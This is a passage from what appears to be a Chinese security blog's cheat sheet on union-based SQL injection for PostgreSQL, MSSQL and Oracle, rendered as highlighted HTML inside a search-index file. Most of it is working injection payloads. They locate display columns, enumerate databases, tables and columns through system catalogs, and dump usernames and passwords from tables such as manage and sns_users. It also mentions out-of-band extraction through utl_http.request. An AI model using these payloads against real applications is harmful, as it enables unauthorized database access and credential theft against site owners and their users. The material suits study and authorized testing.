class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span>,string_agg(table_name,<span class="string">&#x27;~&#x27;</span>),<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span></span><br><span class="line"><span class="comment">--获取字段</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span>,string_agg(column_name,<span class="string">&#x27;~&#x27;</span>),<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;reg_users&#x27;</span></span><br><span class="line"><span class="comment">--获取数据</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span>,string_agg(name,<span class="string">&#x27;~&#x27;</span>),string_agg(password,<span class="string">&#x27;~&#x27;</span>),<span class="string">&#x27;4&#x27;</span> <span class="keyword">from</span> reg_users</span><br></pre></td></tr></table></figure><h1 id="Mssql"><a href="#Mssql" class="headerlink" title="Mssql"></a>Mssql</h1><ul><li>常用函数</li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">Function</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">db_name (N)</td><td style="text-align:left">获取第 n 个数据库</td></tr><tr><td style="text-align:left">@@version</td><td style="text-align:left">获取数据库版本</td></tr><tr><td style="text-align:left">User_Name ()</td><td style="text-align:left">获取当前用户</td></tr><tr><td style="text-align:left">host_name ()</td><td style="text-align:left">获取计算机名称</td></tr></tbody></table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--判断数据库类型</span></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span> (<span class="operator">*</span> ) <span class="keyword">from</span> sysobjects)<span class="operator">&gt;</span><span class="number">0</span></span><br><span class="line"><span class="comment">--判断字段</span></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span></span><br><span class="line"><span class="comment">--获取显错点</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="string">&#x27;null&#x27;</span>,<span class="string">&#x27;null&#x27;</span>,<span class="keyword">null</span></span><br><span class="line"><span class="comment">--获取数据库信息</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="keyword">null</span>, <span class="keyword">null</span>,（<span class="keyword">select</span> @<span class="variable">@version</span>）, <span class="keyword">null</span> <span class="comment">--+</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> db_name(<span class="number">5</span>)),<span class="string">&#x27;null&#x27;</span>,<span class="keyword">null</span></span><br><span class="line"><span class="comment">--获取表名</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="keyword">null</span>,id,name,<span class="keyword">null</span> <span class="keyword">from</span> dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="keyword">null</span>,id,name,<span class="keyword">null</span> <span class="keyword">from</span> dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> name <span class="operator">&lt;&gt;</span> <span class="string">&#x27;manage&#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="keyword">null</span>,id,name,<span class="keyword">null</span> <span class="keyword">from</span> dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;manage&#x27;</span>,<span class="string">&#x27;announcement&#x27;</span>)</span><br><span class="line"><span class="operator">!</span> <span class="comment">--id=-2 union all select top 1 null, id, name, null from dbo.sysobjects where xtype=&#x27;U&#x27; and name not in (&#x27;announcement&#x27;,&#x27;manage&#x27;)</span></span><br><span class="line"><span class="comment">--获取列名</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">null</span>, id, name, <span class="keyword">null</span> <span class="keyword">from</span> dbo.syscolumns <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;5575058&#x27;</span> </span><br><span class="line">id<span class="operator">=</span><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">null</span>, id, name, <span class="keyword">null</span> <span class="keyword">from</span> dbo.syscolumns <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;5575058&#x27;</span>  <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"><span class="comment">--获取数据</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">null</span>,username,password,<span class="keyword">null</span> <span class="keyword">from</span> manage</span><br><span class="line">id<span class="operator">=</span><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">null</span>,username,password,<span class="keyword">null</span> <span class="keyword">from</span> manage <span class="keyword">and</span> username <span class="operator">&lt;&gt;</span> <span class="string">&#x27;admin_mz&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h1><div class="note info simple"><p>dual 为 oracle 一个默认的表</p></div><ul><li>查询数据库信息</li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">info</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">当前用户权限</td><td style="text-align:left">select * from session_roles where rownum=1</td></tr><tr><td style="text-align:left">当前数据库版本</td><td style="text-align:left">select banner from sys. v_$version where rownum=1</td></tr><tr><td style="text-align:left">服务器出口 IP</td><td style="text-align:left">用 utl_http. request 反弹注入可以实现，下面详细操作</td></tr><tr><td style="text-align:left">服务器监听 IP</td><td style="text-align:left">select utl_inaddr. get_host_address from dual where rownum=1</td></tr><tr><td style="text-align:left">日志文件</td><td style="text-align:left">select member from v$logfile where rownum=1</td></tr><tr><td style="text-align:left">服务器 sid</td><td style="text-align:left">select instance_name from v$instance where rownum=1</td></tr><tr><td style="text-align:left">当前连接用户</td><td style="text-align:left">select SYS_CONTEXT(‘USERENV’,’CURRENT_USER’)from dual where rownum=1</td></tr><tr><td style="text-align:left">当前用户</td><td style="text-align:left">select user from dual where rownum=1</td></tr></tbody></table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--获取显错点</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;null&#x27;</span>,<span class="string">&#x27;null&#x27;</span> <span class="keyword">from</span> dual</span><br><span class="line"><span class="comment">--查询数据库名</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> instance_name <span class="keyword">from</span> V$INSTANCE),<span class="string">&#x27;null&#x27;</span> <span class="keyword">from</span> dual</span><br><span class="line"><span class="comment">--查询表名</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="string">&#x27;null&#x27;</span> <span class="keyword">from</span> dual</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;LOGMNR_SESSION_EVOLVE$&#x27;</span>)),<span class="string">&#x27;null&#x27;</span> <span class="keyword">from</span> dual</span><br><span class="line"><span class="comment">--表名模糊查询(表太多了)</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="keyword">like</span> <span class="string">&#x27;%user%&#x27;</span>),<span class="string">&#x27;null&#x27;</span> <span class="keyword">from</span> dual</span><br><span class="line"><span class="comment">--查询列名</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="operator">=</span><span class="string">&#x27;sns_users&#x27;</span>),<span class="string">&#x27;null&#x27;</span> <span class="keyword">from</span> dual</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="operator">=</span><span class="string">&#x27;sns_users&#x27;</span> <span class="keyword">and</span> column_name<span class="operator">&lt;&gt;</span> <span class="string">&#x27;USER_NAME&#x27;</span>),<span class="string">&#x27;null&#x27;</span> <span class="keyword">from</span> dual</span><br><span class="line"><span class="comment">--列名模糊查询</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="operator">=</span><span class="string">&#x27;sns_users&#x27;</span> <span class="keyword">and</span> column_name <span class="keyword">like</span> <span class="string">&#x27;%USER%&#x27;</span>),<span class="string">&#x27;null&#x27;</span> <span class="keyword">from</span> dual</span><br><span class="line"><span class="comment">--查询数据</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> USER_NAME,USER_PWD <span class="keyword">from</span> &quot;sns_users&quot; <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> USER_NAME,USER_PWD <span class="keyword">from</span> &quot;sns_users&quot; <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> USER_NAME <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;zhong&#x27;</span>,<span class="string">&#x27;hu&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
